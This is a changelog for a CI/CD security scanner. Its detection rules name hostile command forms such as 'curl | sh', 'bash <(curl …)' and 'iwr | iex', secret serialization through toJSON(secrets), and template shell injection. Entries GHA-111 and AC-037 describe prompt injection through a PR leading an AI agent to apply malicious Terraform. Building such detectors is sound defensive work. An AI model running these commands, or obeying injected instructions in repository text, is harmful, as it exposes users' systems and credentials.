- **GL-039: GitLab Docker-in-Docker service exposes an unauthenticated
  daemon.** Fires when a job (or the global config) runs a
  `docker:*-dind` service AND disables daemon auth, either via
  `DOCKER_TLS_CERTDIR: ""` (reverts to the plaintext 2375 socket) or by
  exposing / pointing at `tcp://...:2375` in the service `command:` or
  `DOCKER_HOST`. On a shared / untagged runner the unauthenticated
  socket is reachable by every other tenant's job — the container-escape
  vector behind the privileged-dind anti-pattern (CICD-SEC-7).
- **GL-040: GitLab `CI_JOB_TOKEN` used for cross-project / remote
  access.** Flags the two documented job-token idioms in a script
  block — a `gitlab-ci-token:$CI_JOB_TOKEN@<host>` clone URL and a
  `JOB-TOKEN: $CI_JOB_TOKEN` API header. If the target project's inbound
  job-token allowlist is disabled (the pre-hardening default), any
  project that can run a pipeline can reach it (GitLab #243703 /
  CVE-2024-8641). MEDIUM confidence, since a same-project pull uses the
  same idiom (CICD-SEC-2).
- **GL-038: GitLab `CI_DEBUG_TRACE` / `CI_DEBUG_SERVICES` secret-to-log
  leak.** GitLab's debug-trace variables expand the entire environment,
  including masked CI/CD variables and protected secrets, into the job
  log, where anyone with Reporter access (or the trace API) can read
  them. The rule fires when either variable is set truthy in the global
  or a job's `variables:` block (bare-scalar and typed `{value:}` forms
  both matched). No other scanner in the cicd-goat comparison catches
  this (CICD-SEC-10 / CICD-SEC-6).
- **ADO-032: Azure `checkout` with `persistCredentials: true`.** The
  Azure analogue of the GitHub `persist-credentials` / ArtiPACKED leak
  (GHA-037). `persistCredentials: true` writes the pipeline
  `System.AccessToken` into `.git/config` as an `AUTHORIZATION` bearer
  header after fetch, where any later step (or untrusted PR build code)
  can recover and reuse it (CICD-SEC-6).

### Changed

- **ADO-002 now scans task-based script steps and flags template
  injection.** It read the `script:` / `bash:` / `pwsh:` / `powershell:`
  shorthands but not the inline `inputs.script` of a `task: Bash@3` /
  `PowerShell@2` / `CmdLine@2` step, so a
  `$(System.PullRequest.SourceBranch)` macro spliced into a `Bash@3` task
  slipped through (cicd-goat scenario 49). It also now flags compile-time
  template injection: a free-form `string` parameter (no `values:`
  allowlist) spliced into a script via `${{ parameters.X }}`, which
  becomes pipeline structure before any quoting applies (scenario 50).
- **BB-002 now flags custom-pipeline variable injection.** Beyond the
  `$BITBUCKET_*` ref variables it already caught, it flags a trigger-time
  variable declared by a `custom:` pipeline (`- variables: [{name: X}]`)
  referenced unquoted in a later `script:` step. Anyone with run / trigger
  rights supplies the value, so it is the Bitbucket analogue of a
  workflow_dispatch input (cicd-goat scenario 66).
- **CC-002 now flags `<< pipeline.git.branch >>` / `<< pipeline.git.tag >>`
  interpolation.** Beyond the `$CIRCLE_*` shell vars it already caught,
  the rule now flags CircleCI's native `<< pipeline.git.* >>`
  interpolation of the attacker-named ref into a `run:` command.
  `<< pipeline.parameters.* >>` (typed, workflow-set) stays the safe
  alternative and is not flagged (cicd-goat scenario 56).
- **BB-023 now also flags Bitbucket's structural clone bypass.** In
  addition to the shell-level TLS-verification bypasses it already
  detected (`curl -k`, `git http.sslVerify=false`, ...), the rule now
  walks `clone: { skip-ssl-verify: true }` (global and step-level),
  which disables certificate verification on the repository clone
  itself so a MITM can inject source before any script runs. The clone
  bypass is structural YAML (a key plus a bool), so it never reached
  the script-text scan.

### Fixed

- **TKN-003 no longer exempts double-quoted Tekton params.** The rule
  skipped a `$(params.X)` / `$(workspaces.X.path)` token wrapped in
  double quotes, but Tekton substitutes the value into the script text
  *before* the shell parses it, so quoting in the template gives no
  protection: an attacker value containing a `"` closes the quote and
  the rest runs as shell (the rule's own recommendation already said
  so). The carve-out is removed; any param/workspace token in a
  `script:` body now fires, and the env-var indirection pattern stays
  the documented safe form. Closes the false negative on cicd-goat
  scenario 71. The Helm
  provider rendered charts by shelling out to `helm template`; when the
  binary was absent (the common case in CI images and on dev machines)
  it skipped the chart and ran only the `HELM-*` Chart.yaml metadata
  rules, so a chart's privileged container / hostPath / weak
  securityContext bugs silently vanished and the report could grade a
  node-root-mounting DaemonSet "A". The provider now falls back to a
  best-effort offline parse of `templates/*.yaml` (Go-template
  expressions neutralized, each template parsed independently) and runs
  the full `K8S-*` rule pack on the literal fields. Exact rendering
  still uses `helm` when it's installed. Restores detection on the
  cicd-goat Helm scenarios (privileged pod, root + privilege
  escalation, hostPath node escape).
- **GHA-016 / curl-pipe now flags process substitution.** The
  `remote_script_exec` primitive matched `curl … | bash`,
  `sh -c "$(curl …)"`, and `wget … | sudo sh`, but not the
  process-substitution form `bash <(curl …)` (also `sh <(wget …)`,
  `source <(curl …)`), which runs the fetched content through a
  `/dev/fd` handle with no pipe character. That gap let the most
  common curl-pipe evasion through. All providers that reuse the
  primitive inherit the fix.
- **BB-029 now inspects the top-level Bitbucket `image:`.** The rule
  walked step-level and `definitions.services.*` images but not the
  document-root `image:`, which is the global default every step
  inherits and the most load-bearing surface to pin. A pipeline whose
  only image is a top-level mutable tag (`image: node:latest`) is now
  flagged.

## [1.8.0] - 2026-06-03

### Added

- **Fleet SDLC posture graph (JSON).** The fleet report now bundles a
  cross-repo posture graph the fleet / CXPC engine already implies but
  never exposed as data. ``fleet.json`` gains a ``posture_graph`` key:
  **nodes** are the scanned repos (carrying grade / score / per-severity
  failed-finding breakdown), **edges** are the cross-repo (CXPC)
  relationships as directed ``source -> target`` links (the producer
  repo that carries the risk to the consumer / partner repo that
  inherits it), tagged with the chain id / severity / title. A chain
  endpoint outside the scanned fleet (a partner repo referenced but not
  scanned) still appears as a node with ``scanned: false`` so the edge
  isn't dropped. To make the edges first-class, ``Chain`` gained a
  structured ``repos`` field (``[source, target]`` for cross-repo
  chains, empty otherwise) that CXPC-001..004 now populate, so the
  repo-to-repo link is data rather than only narrative prose; it also
  surfaces in each cross-repo chain's JSON. ``fleet.md`` gets a matching
  "Cross-repo posture graph" edge table. The graph is the topology view
  commercial ASPM tools sell; a lightweight HTML rendering of it is a
  deferred follow-up. Builds on the fleet phase-2 / CXPC infrastructure;
  no new scan work, just the implied graph as output.
- **NPM-018: latest release published by a new npm account
  (publisher-change / takeover signal).** The active-takeover companion
  to NPM-014's single-publisher blast radius (the roadmap follow-up the
  behavioral-signals review flagged as "the actual takeover vector,
  worth a higher severity"). Reads each direct dependency's per-version
  publisher (the packument's ``_npmUser`` account that ran ``npm
  publish``, from the same fetch NPM-008 / NPM-014 already do, so no
  extra requests) and flags a package whose ``dist-tags.latest`` version
  was published by an account that published none of its prior versions,
  the axios / @ctrl/tinycolor account-takeover fingerprint. Requires at
  least three prior versions with a known publisher, so brand-new
  packages (NPM-008 cooldown territory) are skipped, and skips silently
  when the packument doesn't expose ``_npmUser`` (the conservative
  default NPM-017 uses). MEDIUM severity (it fires the blast radius
  NPM-014 only measures), MEDIUM confidence via the central
  ``_confidence.py`` registry (a legitimate maintainer hand-off trips it
  the same as a takeover), ``--resolve-remote``-gated, scoped to direct
  dependencies. npm 17 -> 18.
- **Reachability-aware attack chains, phase 2: across the reusable-
  workflow boundary.** The dataflow tier now spans GitHub Actions'
  reusable-workflow `uses:` boundary. **TAINT-003** (untrusted input
  forwarded into a reusable workflow's `with:` inputs) now populates
  `Finding.taint_flows` with a `cross_document` edge per forward: a
  forward confirmed to reach an unquoted `${{ inputs.<name> }}` sink in
  a *loaded* callee (on disk, or fetched by `--resolve-remote`) keys its
  `sink_job` on the resolved callee `Workflow.path`; an unconfirmed or
  unresolved forward carries the raw callee ref instead, so it surfaces
  the edge without claiming reachability. **AC-002** gains a
  cross-document tier: a confirmed TAINT-003 forward whose callee path
  also has an ungated deploy (GHA-014) reports a dataflow-confirmed
  injection-to-deploy chain spanning `[caller, callee]` (a poisoned
  input forwarded into a reusable deploy workflow). It never fires
  without the callee body in scope, since only a confirmed forward keys
  its edge on a real path. This closes the last phase-2 follow-up; the
  per-document grouping it complements is unchanged.
- **Reachability-aware attack chains, phase 2 (dataflow DAG).** The
  chain engine can now confirm an injection-to-impact chain by walking
  the actual taint graph between its two legs, not just by intersecting
  their `job_anchors` (the phase-1 shared-job signal). The TAINT-NNN
  rules expose their source-to-sink edges as a new structured
  `Finding.taint_flows` (`source_job -> sink_job` plus the rendered
  path); a new `chains/_reachability.py` helper builds a directed graph
  from those edges and breadth-first searches (multi-hop) from the
  injection job(s) to the impact job(s). **AC-002** (GitHub script-
  injection to unprotected deploy) and **AC-022** (the GitLab analog)
  now report a *proven dataflow path* (the precise connecting job chain,
  e.g. `extract -> deploy`, plus the rendered taint path) when one
  exists, falling back to the phase-1 shared-job signal otherwise, so
  nothing the older chains detected is regressed. AC-002 walks GHA's
  step / job-output taint flows (TAINT-001 / TAINT-002); AC-022 walks
  GitLab's dotenv-artifact and `extends:`-inheritance flows (TAINT-004 /
  TAINT-008); each provider's TAINT rules now populate
  `Finding.taint_flows`. A new `Chain.via_dataflow` flag marks the
  stronger tier in the JSON output and the terminal badge, and a new
  `--chains-require-dataflow` CLI gate keeps only dataflow-confirmed
  chains (stricter than `--chains-require-reachability`).
- **Reachability-aware attack chains, phase 2: Tekton, Argo, and
  Buildkite.** Extends the phase-2 dataflow tier to the three remaining
  injection chains, so each provider with a TAINT engine now reports a
  proven path rather than file co-occurrence. Their TAINT rules populate
  `Finding.taint_flows`: **TAINT-005** (Buildkite `buildkite-agent
  meta-data` set/get round-trip), **TAINT-006** (Tekton
  `$(tasks.<t>.results.<r>)` results channel), and **TAINT-007** (Argo
  `{{tasks.<t>.outputs.parameters.<o>}}` cross-template forwarding).
  **AC-026** (Buildkite injection to unmanual deploy) keys its edges on
  step labels, the same identifiers BK-003 / BK-007 anchor on, and
  confirms when a meta-data value reaches the deploy step. **AC-025**
  (Argo param injection to privileged template) qualifies each edge with
  the document's `<Kind>/<name>:` prefix so a producer template whose
  tainted output flows into a *separate* privileged consumer template
  resolves to a cross-template node-escape path. **AC-023** (Tekton param
  injection to privileged step) bridges the Task/Pipeline document split:
  TAINT-006 keys its edges on each Pipeline task's resolved `taskRef`
  document id (`<Kind>/<name>`), matching TKN-002 / TKN-003's per-step
  anchor prefix, so a tainted result flowing from one Task into a
  privileged Task is confirmed across documents while the precise
  same-step signal is preserved as the fallback. Each falls back to the
  phase-1 shared-anchor signal, then plain co-occurrence, so nothing
  regresses; all three honor `Chain.via_dataflow` and
  `--chains-require-dataflow`. Cross-document reachability through
  reusable workflows (TAINT-003) remains the one open phase-2 follow-up.
- **`devenv` provider: developer-environment auto-execution scanner
  (DEV-001..005).** New `--pipeline devenv` provider that scans the
  config files which run code the moment a developer opens or checks out
  the repo, a surface distinct from the CI-pipeline definitions the rest
  of the scanner covers. Parses `.vscode/tasks.json`,
  `.devcontainer/devcontainer.json` (root, and the
  `.devcontainer/<name>/` layout), and `.claude/settings.json` /
  `settings.local.json` as JSON(C) (comments and trailing commas
  tolerated, string-aware so a `//` inside a URL survives), no tokens,
  no network. **DEV-001** (LOW) a VS Code task with
  `runOptions.runOn: folderOpen`; **DEV-002** (LOW) a devcontainer
  lifecycle command (`postCreateCommand` and friends); **DEV-003**
  (MEDIUM) a committed Claude Code `type: command` hook (SessionStart
  and the other events); **DEV-004** (CRITICAL) any auto-run command
  that fetches and executes remote code (`curl | sh`, `iwr | iex`,
  `bash -c "$(curl …)"`), reusing the shared
  `_primitives/remote_script_exec` detector but scoped to the auto-run
  command strings to keep the false-positive rate near zero; **DEV-005**
  (HIGH) a devcontainer `initializeCommand`, which runs unsandboxed on
  the host before the container is built. Models the second stage of the
  2026 Red Hat npm compromise (loaders that fire on repo open). Auto-
  detected when `.vscode/` / `.devcontainer/` / `.claude/` config files
  are present; mapped across OWASP CICD-SEC-3/4/7, NIST 800-53, and ESF.
  Provider count 32 -> 33.
- **`pipeline_check fix-pr`: apply autofixes and open a pull / merge
  request.** New subcommand that closes the gap between "patch on disk"
  and "PR in your inbox". Scans the auto-detected pipeline files,
  applies the autofixers of the chosen ``--safety`` tier
  (``safe`` default / ``unsafe`` / ``all``, the same vocabulary as
  ``--list-fixers``), commits the changed files to a fresh branch
  (``pipeline-check/autofix``, auto-suffixed on collision), pushes, and
  opens the request. GitHub uses ``gh pr create``; GitLab creates the MR
  via ``-o merge_request.*`` push options (no token or ``glab`` needed);
  other hosts get the branch pushed with manual instructions. Refuses a
  dirty working tree by default (``--allow-dirty`` overrides, and even
  then stages only the autofix edits). ``--dry-run`` shows the patch and
  the planned git actions without touching the repo; ``--no-push`` stops
  after the local commit; ``--base`` / ``--branch`` / ``--remote`` /
  ``--checks`` / ``--title`` / ``--body`` tune the rest. Reuses the
  existing autofix engine (the apply path was split into a pure planner
  plus a writer) and a new ``core/fix_pr.py`` for the git / host
  plumbing. Documented under ``--man autofix``.
- **AC-039: untrusted trigger reaches a bulk-secrets serialization
  (CRITICAL chain).** Correlates an attacker-influenced trigger
  (GHA-002 / GHA-009 / GHA-013) with a step that serializes the whole
  secrets context (GHA-116) on the same workflow: an external attacker
  who opens a fork PR or posts a comment triggers a run that dumps every
  secret into a world-readable log, the *reachable* form of the 2025
  tj-actions / GhostAction secret-harvesting attacks (where the payload
  needed a compromised action or pushed workflow, this lane needs only a
  pull request). Confirms reachability when a job is both
  attacker-reachable and serializes the secrets (HIGH confidence) via
  ``job_anchors`` (GHA-116 now emits them). MITRE T1195.002 / T1552 /
  T1567.002. Attack-chain count 52 -> 53.
- **GHA-116: workflow serializes the entire secrets context
  (``toJSON(secrets)``) (HIGH).** New GitHub Actions rule for the 2025
  secret-harvesting wave (tj-actions/changed-files + reviewdog,
  CVE-2025-30066; the GhostAction campaign, 3,325 secrets stolen).
  ``${{ toJSON(secrets) }}`` serializes every credential a job can see
  into a single string, so one log line or outbound request exfiltrates
  all of them at once, the in-YAML primitive both campaigns relied on.
  Fires when it appears in a step ``run:`` / ``env:`` / ``with:``, a job
  ``env:``, or a workflow ``env:`` (the ``fromJSON(toJSON(secrets))`` /
  ``format(..., toJSON(secrets))`` wrappers match too). HIGH severity /
  HIGH confidence: serializing the whole secrets object has no benign
  per-secret use. Distinct from GHA-033 (echoes a named secret), GHA-034
  (``secrets: inherit``), and GHA-057 (secret-scanner output to egress).
  github rule count 106 -> 107. Mapped to OWASP CICD-SEC-6, ESF
  ESF-D-SECRETS, and the standard supply-chain set.
- **PYPI-021: direct dependency provenance built from a non-release ref
  (LOW, MEDIUM confidence).** The PyPI / PEP 740 analog of NPM-017.
  Extends PYPI-019 (provenance gap): where PYPI-019 flags a missing PEP
  740 attestation, PYPI-021 fetches each direct dependency's latest-release
  provenance object via ``--resolve-remote`` (the integrity-endpoint URL
  the PyPI JSON API exposes on each attested file, host-pinned to
  ``pypi.org``) and parses the SLSA ``source ref``. Flags a release whose
  ref is a branch other than ``main`` / ``master`` rather than a version
  tag, the same "untrusted branch" / Red Hat compromise signal NPM-017
  covers on the npm side: valid provenance, attacker-controlled build ref.
  Reuses the shared ``_primitives/provenance_ref`` extractor (DSSE -> in-toto
  -> SLSA v1). Scoped to direct dependencies, LOW severity (posture signal
  below the default ``--fail-on`` gate), MEDIUM confidence. pypi rule count
  19 -> 20. Mapped to OWASP CICD-SEC-4, ESF ESF-S-VERIFY-DEPS, NIST 800-53,
  NIST CSF 2, PCI DSS v4, and SOC 2 (same controls as PYPI-019).
- **NPM-017: direct dependency provenance built from a non-release ref
  (LOW, MEDIUM confidence).** Consumer-side provenance source-ref check
  that extends NPM-015 (provenance gap). Where NPM-015 flags a missing
  attestation, NPM-017 reads the attestation bundle via ``--resolve-remote``
  and flags a latest release whose SLSA ``source.ref`` is a branch name
  rather than a version tag, the npm "untrusted branch" / Red Hat npm
  compromise signal: the package ships valid provenance, but the build ran
  from an attacker-controlled branch, not the canonical release ref.
  Scoped to direct dependencies, LOW severity (posture signal below the
  default ``--fail-on`` gate), MEDIUM confidence. Pairs with the
  GHA-113/GHA-114/GHA-115 + AC-038 workflow-side family that covers the
  same attack. The PyPI / PEP 740 analog ships as PYPI-021. npm rule
  count 16 -> 17. Mapped to OWASP CICD-SEC-4, ESF ESF-S-VERIFY-DEPS, NIST
  800-53, NIST CSF 2, PCI DSS v4, and SOC 2 (same controls as NPM-015).
- **GHA-115: ``id-token: write`` granted workflow-wide instead of
  job-scoped (MEDIUM, MEDIUM confidence).** New GitHub Actions rule for
  the least-privilege OIDC surface raised by the npm untrusted-branch
  writeup: when the workflow-level ``permissions:`` block grants
  ``id-token: write`` but only a subset of jobs (publish, deploy) actually
  consume the OIDC token, every other job in the workflow inherits a
  publish-capable mint right it never needs. A compromised build or test
  job can use that inherited permission to obtain a cloud or registry
  token without running the intended publish step. Fires when a
  workflow-level ``permissions: id-token: write`` is detected and at least
  one non-consumer job (no OIDC-consuming action or CLI invocation) runs
  in the same workflow. Recommend scoping ``id-token: write`` to the
  specific job that mints the token and setting ``id-token: none`` at the
  workflow level (or omitting the workflow-level grant entirely). The
  least-privilege sibling of GHA-069 (orphan ``id-token: write`` with no
  consumer at all); reuses GHA-069's consumer-detection logic. Mapped
  across all 9 standards that cover GHA-069. github 105 -> 106.
- **GHA-114: Package-publish workflow runs on an unrestricted push trigger
  (HIGH, MEDIUM confidence).** New GitHub Actions rule for the npm
  "trusted publishing, untrusted branch" attack: a publish workflow
  reachable from an unrestricted ``push`` trigger (wildcard ``branches:``
  pattern or no branch filter at all) lets a counterfeit workflow on any
  throwaway branch mint the OIDC publish token and ship a release as
  though it were the real one. Fires when a workflow contains a
  package-publish step (``npm publish``, ``pypa/gh-action-pypi-publish``,
  ``cargo publish``, ``rubygems/release-gem``, etc.) and its ``on:`` block
  includes an unrestricted ``push`` event (no ``branches:`` filter or a
  ``branches: ['*']``-style wildcard). Recommend gating publishes on
  ``on: push: tags:`` patterns, ``release:`` events, or
  ``workflow_dispatch`` only. The trigger-side twin of GHA-113 (env-gate
  side); both generalize GHA-086 to the full trusted-publisher surface.
  Mapped across all 12 standards. github 104 -> 105.
- **GHA-113: OIDC trusted-publishing job without an environment gate
  (HIGH).** New GitHub Actions rule for the npm "trusted publishing,
  untrusted branch" shape (the Red Hat npm compromise, BoostSecurity
  2026). Fires when one job has effective ``id-token: write`` (declared,
  inherited, or ``write-all``), runs a package-publish step (``npm`` /
  ``pnpm`` / ``yarn publish``, ``twine upload``, ``poetry`` / ``uv
  publish``, ``gem push``, ``cargo publish``, or the trusted-publisher
  actions ``pypa/gh-action-pypi-publish`` / ``rubygems/release-gem`` /
  ``crates-io/publish-action``), and binds no ``environment:``. Trusted
  publishing validates only org + repo + workflow filename, so without
  an environment's deployment-branch rule the OIDC token mints from any
  branch that runs the workflow. The registry-publish twin of GHA-030
  (cloud OIDC without env gate); closes the seam GHA-050 leaves by
  passing the OIDC path. Emits ``job_anchors`` for a future
  untrusted-branch-reaches-publish chain. Mapped across all 12
  standards. github 103 -> 104.
- **GHA-112: self-hosted deploy job not gated by a protected
  environment (HIGH).** New GitHub Actions rule completing the
  self-hosted-runner pack. Fires when a job runs on a self-hosted
  runner (the ``self-hosted`` label, any ``runs-on`` shape), is a
  deploy (by job-name or a deploy command, ``kubectl apply`` /
  ``terraform apply`` / ``helm upgrade`` / ``aws|gcloud|az ... deploy``,
  etc.), and has no ``environment:`` binding, so persistent org
  infrastructure with standing credentials ships to production on any
  push with no required reviewer. The HIGH self-hosted case of GHA-014
  (MEDIUM); complements GHA-012 / GHA-068 / GHA-105. Local-mock deploys
  (LocalStack / kind) are carved out. The deploy-command vocabulary
  moved to a shared ``_primitives/deploy_names`` primitive that GHA-014
  now reuses. Mapped across all 12 standards. github 102 -> 103.
- **AC-038: Untrusted branch reaches OIDC trusted publish (CRITICAL).**
  New attack chain intersecting GHA-114 (publish workflow on an
  unrestricted push trigger) with GHA-113 (OIDC publish job with no
  environment gate) on the same job: a publish token mintable from any
  branch with no human or branch gate, the reachable form of the npm
  "trusted publishing, untrusted branch" compromise (Red Hat npm, 2026).
  Confirms an executable path when the two findings' ``job_anchors``
  intersect (promoting the composite to HIGH confidence); co-occurrence
  on different jobs stays an unconfirmed signal. The OIDC trusted-
  publishing lane AC-029 (the long-lived-token publish lane) cannot
  reach. Chain count 51 -> 52.
- **AC-037: AI agent applies attacker-influenced IaC to the cloud
  (CRITICAL).** New attack chain pairing an untrusted-input agent leg
  (GHA-058, an agentic CLI with permission-bypass flags / PR-checkout
  topology, or GHA-103, an AI review bot on an untrusted trigger) with
  GHA-111 (an agent next to an unattended IaC apply) on the same
  workflow. A prompt-injection payload in the PR or comment makes the
  agent write malicious Terraform / CloudFormation that the apply
  pushes to the cloud account with no human review, the cloud-account
  analog of AC-035's reviewer-and-committer loop. Chain count
  50 -> 51.
- **GHA-111: AI agent generates IaC applied in the same job (HIGH).**
  New GitHub Actions rule closing the AI-agent-risk gap the roadmap
  flagged. Fires when one job runs an agentic CLI (``claude`` /
  ``gemini`` / ``q chat`` / ``cursor-agent`` / ``aider`` /
  ``openhands`` / ``goose``) alongside an unattended IaC apply
  (``terraform apply``, ``terragrunt apply``, ``aws cloudformation
  deploy`` / ``create-stack`` / ``update-stack`` /
  ``execute-change-set``, ``cdk deploy``, ``pulumi up``, ``sam
  deploy``). A prompt-injected agent rewrites the Terraform /
  CloudFormation in the shared workspace and the apply pushes it
  straight to the cloud account with no plan reviewed. Distinct from
  GHA-104 (agent pushes to the repo) and GHA-106 (agent holds a
  write-scoped ``GITHUB_TOKEN``): the blast radius here is the cloud
  account. Read-only ``terraform plan`` / ``cdk diff`` and agents
  split across jobs are not flagged. Mapped across all 12 standards.
  github 101 -> 102.

### Changed

- **Proof-of-exploit examples on two Cloud Build MEDIUM rules.** The
  other CI-style provider the v1.7.0 sweep skipped, and the last
  concrete-primitive batch of the backfill. GCB-013 (a step running a
  git / path / tarball ``pip install`` that bypasses the registry and
  lockfile) and GCB-016 (a step ``dir:`` with a ``..`` escape that
  resolves outside ``/workspace`` into the builder image's filesystem)
  now carry a Vulnerable/Attack/Safe ``exploit_example``.
- **Proof-of-exploit examples on three Argo Workflows MEDIUM rules.**
  Closes a gap the v1.7.0 CI sweep left: Argo is a CI-style provider
  whose concrete primitives mirror the Kubernetes / Tekton packs.
  ARGO-003 (a Workflow on the namespace ``default`` ServiceAccount),
  ARGO-013 (``automountServiceAccountToken`` not opted out, so a
  compromised step reads the mounted SA token), and ARGO-014 (a template
  script running ``npm install`` instead of ``npm ci``, an unpinned
  install) now carry a Vulnerable/Attack/Safe ``exploit_example``.

### Fixed

- **CCM-002 (CodeCommit repo encryption) aligned with CA-001.** The check
  carried a dead ``"alias/aws/codecommit" not in key`` branch: the
  CodeCommit API returns the resolved KMS key ARN (not the alias string),
  so a repo on the AWS-managed default would silently pass once resolved,
  yet the branch suggested it was detected. Following the resolution its
  own docs_note already pointed at ("same shape as CA-001"), the check now
  flags only the absent-key case (``passed = bool(key)``) and documents
  that classifying the managed default vs a CMK would need a separate
  ``kms:DescribeKey`` call. No collector change; closes the final open
  rule-audit finding.
- **ACR-005 reframed as an advisory (ACR has no registry-level tag
  immutability).** The check inferred tag immutability from a registry's
  quarantine / export policy, an unrelated proxy that false-positived on
  default registries and false-negatived on mutable ones. Azure Container
  Registry, unlike ECR's ``imageTagMutability``, has no registry-level
  immutability setting: it's a per-repository / per-tag
  ``writeEnabled=false`` lock applied through the data plane, which a
  registry-level posture scan cannot enumerate. ACR-005 is now an INFO
  advisory that always passes and carries the recommendation (lock
  critical production tags via ``az acr repository update --write-enabled
  false`` and/or pin by digest) instead of asserting a proxy-based
  verdict. Severity MEDIUM -> INFO; provider and standards docs
  regenerated. (Closes the last open rule-audit finding that didn't
  require a collector change.)
- **Rule audit: title / severity / ESF-mapping corrections (5 rules).**
  The closing audit batch, aligning catalog metadata with each rule's
  actual behavior. **CB-004**'s title was "No build timeout configured"
  but the check fires on a missing timeout *or* one set to the AWS
  maximum (480 min); retitled to match. **CF-001** declared ``HIGH`` but
  the finding it emits is ``CRITICAL`` (a long-lived ``AWS::IAM::AccessKey``
  in a template); the declared severity now matches. **CF-003**'s title
  claimed the project "references" a public subnet, but the check fires
  when the project's VPC merely *contains* one; retitled (catalog and
  emitted finding now agree). **PBAC-003**'s title / docs_note claimed
  CodeBuild scoping, but the check flags every ``AWS::EC2::SecurityGroup``
  with open all-port egress in the template; prose corrected to the actual
  scope (narrowing the check to CodeBuild-attached groups is a separate
  decision, deliberately not taken here to avoid new false negatives).
  **ADO-024**'s ESF mapping disagreed between the rule module
  (``ESF-S-PROVENANCE`` alone) and the standards registry (``ESF-D-SBOM`` /
  ``ESF-D-SIGN-ARTIFACTS``); the module is now aligned to the registry and
  to its cross-provider siblings GHA-024 / GL-024 / BB-024 (``ESF-D-SBOM``
  + ``ESF-D-SIGN-ARTIFACTS``). Provider docs regenerated.
- **Rule audit: logic-bug fixes and test strengthening.** The final audit
  cluster, each fix pinned by a regression test. **ADO-003** no longer
  escalates a plain secret to CRITICAL just because the variable name
  contains "AWS" (the severity bump now keys on a real AKIA-shaped value,
  not a name substring), and stops double-counting a bare top-level
  ``variables:`` block. **CB-005** now locks ``HIGH`` confidence when a
  CodeBuild image is two or more versions behind (the behavior its
  ``known_fp`` and the confidence registry already documented but the
  check never implemented; one-behind still demotes to MEDIUM).
  **CARGO-005** dropped a dead ``seen`` set. **GCB-005**'s docstrings were
  corrected to match the parser (a bare integer ``timeout:`` is read as a
  seconds count; only minute/hour suffixes are rejected). Test gaps closed:
  ARGOCD-013 now pins ``revisionHistoryLimit: 0`` passing, AZMON-004 covers
  the has-diagnostics pass path (previously unreachable without the azure
  SDK installed), and the CloudFormation CA-004 variant gains a
  scoped-policy-passes assertion.
- **Rule audit: ``docs_note`` / ``recommendation`` accuracy in 20 rules.**
  A verify-first pass over the audit's metadata findings reconciled each
  rule's prose with what its detector actually does (no behavior, count,
  or standards-mapping change). Corrected token-catalog names (ARGO-011
  ``in-toto-attestation``, BK-010 ``spdx-sbom-generator``) and dropped
  names that were never tokens (ARGO-012 ``anchore``; BK-012
  ``anchore`` / ``dependency-check``); made over-specific scanner
  enumerations illustrative (ADO-020, BB-015); removed claims for surfaces
  the code never inspects (BK-006 pipeline-level timeout default, CC-010
  ``machine: true`` executor, BK-015 quote-awareness, BB-016 Docker-image
  override); fixed inaccurate keyword / example lists (BK-007 deploy
  verbs, BK-008 curl ``--insecure`` example, CP-005 ``live`` token); added
  scanned surfaces the prose omitted (CARGO-001 / CARGO-007 workspace
  tables); and corrected wrong claims (ARGOCD-008 plugin-name handling,
  ARGOCD-013 ``revisionHistoryLimit: 0``, ADO-014 ``known_fp`` rationale,
  EB-001 event detail-type, SIGN-001 substring match). Provider docs
  regenerated. (13 sibling metadata / test findings from the same audit
  were verified STALE, already fixed by earlier batches, and needed no
  change.)
- **English-variant enforcement: closed the PAIRS gaps the rule audit
  flagged.** The ``test_english_variant.py`` guard list was missing
  several British ``-ise`` / ``-isation`` word families (the
  ``sanitize``, ``organization``, ``parameterize``, ``tokenize``,
  ``generalize``, and ``specialize`` families, named here by their
  American form, plus inflections), so the British forms could land in
  source and docs unchecked. Added the pairs to the PAIRS
  list (and to the bulk-converter list + the CLAUDE.md reference table)
  and converted every existing occurrence to American spelling across
  rule docstrings, recommendations, ``docs_note`` text, comments, a
  workflow fixture, generator scripts, and CHANGELOG history. Provider
  and standards docs regenerated. Prose-only: no rule behavior, count, or
  detection change.
- **Rule audit: ``docs_note`` accuracy drift in four rules.** A
  follow-up pass reconciled each rule's ``docs_note`` prose with what
  its detector actually inspects. ARGO-010 now lists the real SBOM-token
  catalog (``anchore/sbom-action`` and ``spdx-sbom-generator`` instead of
  the never-present ``spdx-tools``). GCB-017 drops the ``gcloud run
  deploy`` example from its image-production note (``_produces_image``
  only recognizes ``docker push`` / ``docker build`` steps and top-level
  ``images:``). GCB-024 now says it walks each step's ``name`` + ``args``
  (not ``entrypoint`` / ``cmd``, which it never read). BK-005 documents
  the ``docker`` / ``docker-compose`` plugin-config form (``privileged:
  true`` / a ``/var/run/docker.sock`` volume) its detector already flags
  alongside command strings. Prose-only: no detection, count, or
  standards-mapping change; provider docs regenerated. (ARGO-009,
  GCB-008, and GCB-023 were flagged by the same audit but their gaps had
  already been closed by the earlier false-negative fixes, so no change
  was needed.)
- **Rule audit: unparseable GitHub Actions ``exploit_example`` snippets.**
  A parse scan of the github pack (never covered by the original audit)
  found seven rules whose documented exploit example contained YAML no
  loader accepts, so the snippet would silently fail to parse if a user
  fed it back through the scanner: a ``${{ ... }}`` expression inside a
  YAML *flow* mapping (GHA-111, GHA-055, TAINT-002, TAINT-003) and a
  ``run:`` plain scalar carrying a ``: `` (GHA-072, TAINT-009). All
  switched to block style; GHA-002's prose em-dash and a few British
  ``-ise`` spellings in the touched examples were corrected at the
  same time. A new ``tests/github/test_audit_regressions.py`` pins every
  github example to parse via the production loader, and the
  self-contained single-workflow examples (GHA-055/072/111) to still
  fire on the Vulnerable half and pass on the Safe half. No rule
  behavior, count, or doc output changed.
- **Rule audit: false-positive, false-negative, and crash fixes across
  the AWS, Azure, and CloudFormation checks.** A read-only audit of the
  rule pack surfaced a batch of defects, now fixed and pinned with
  regression tests. S3-005 no longer crashes when a bucket policy
  carries ``Statement`` as a single object (not a list) and now
  detects a list-form ``["false"]`` ``aws:SecureTransport`` value.
  ECR-003 tolerates a string principal without crashing, flags the
  list-form ``{"AWS": ["*"]}`` wildcard, and stops flagging a wildcard
  scoped by ``aws:PrincipalOrgID`` (the org-sharing idiom). CP-005
  matches ``prod`` / ``live`` as whole words, so ``Delivery`` and
  ``Product`` are no longer read as production stages. IAM-005 no
  longer flags a same-account trust principal as a confused-deputy
  risk. PBAC-002, CD-003, LMB-004, ENTRA-002, ENTRA-004, ENTRA-006,
  and ADO-013 no longer crash on a missing name key, a null
  ``builtInControls``, a non-dict ``Condition``, mixed naive/aware
  datetimes, a non-string risk level, or a structured ``demands``
